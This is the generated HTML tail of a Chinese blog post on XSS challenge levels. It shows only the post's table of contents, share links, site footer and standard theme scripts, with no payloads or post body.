class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1-1"><span class="toc-number">5.1.</span> <span class="toc-text">方法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2-1"><span class="toc-number">5.2.</span> <span class="toc-text">方法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">6.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">6.2.</span> <span class="toc-text">法 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-3"><span class="toc-number">6.3.</span> <span class="toc-text">法 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1-1"><span class="toc-number">7.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2-1"><span class="toc-number">7.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1-2"><span class="toc-number">8.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2-2"><span class="toc-number">8.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC8-1%E5%85%B3"><span class="toc-number">9.</span> <span class="toc-text">第8-1关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC8-2%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">第8-2关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">11.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">12.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&text=XSS初探-独孤九剑"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&is_video=false&description=XSS初探-独孤九剑"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS初探-独孤九剑&body=Check out this article: http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&name=XSS初探-独孤九剑&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&t=XSS初探-独孤九剑"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
